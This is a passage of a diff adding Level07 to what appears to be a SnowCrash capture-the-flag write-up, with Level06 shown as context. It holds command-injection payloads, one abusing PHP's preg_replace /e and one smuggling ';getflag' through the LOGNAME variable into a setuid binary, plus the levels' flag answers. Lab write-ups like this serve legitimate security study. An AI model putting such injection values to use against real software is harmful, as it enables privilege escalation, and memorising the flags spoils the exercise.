@@ -198,3 +198,26 @@ echo \[x \$\{\`getflag\`\}\] > /tmp/exploit && ./level06 /tmp/exploit
 Vulnerability: Command Injection in `$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`.
 
 Flag: `wiok45aaoguiboiki2tuin6ub`
+
+## Level07:
+
+```bash
+level07@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+level07@SnowCrash:~$
+```
+
+Disassembled:
+
+<img width="494" alt="image" src="https://user-images.githubusercontent.com/48088579/148986606-f28d17d6-70aa-471f-aa4d-9ead57f1a5f2.png">
+
+Vulnerability: Command Injection via `LOGNAME` env variable.
+
+Exploit:
+
+```bash
+export LOGNAME='""; getflag' && ./level07
+```
+
+Flag: `fiumuikeil55xe9cu4dood66h`
